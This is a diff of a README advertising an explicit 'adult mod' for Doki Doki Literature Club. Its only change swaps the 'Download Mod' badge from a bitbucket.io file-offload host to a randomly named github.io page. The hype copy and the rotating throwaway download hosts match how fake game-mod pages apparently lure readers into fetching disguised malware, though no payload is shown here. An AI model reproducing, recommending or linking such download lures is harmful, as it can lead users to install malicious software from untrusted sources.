@@ -2,7 +2,7 @@
 
 Think Doki Doki Literature Club was intense before? Wait till you see what’s hiding behind the cute visual novel vibes. The **Doki Doki Adult Mod** cracks open the wholesome surface and dives deep into the **18+ world** of explicit routes, uncensored CGs, spicy dialogue, and emotional chaos. If you're ready to explore DDLC from a darker, more adult perspective, this mod’s got everything you’ve been *curious* about and more. 💋📖
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload2.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Doki-Doki-Adult-Mod-fihu7.github.io/.github)
 ---
 
 ## 🧠 What Is the Doki Doki Adult Mod?
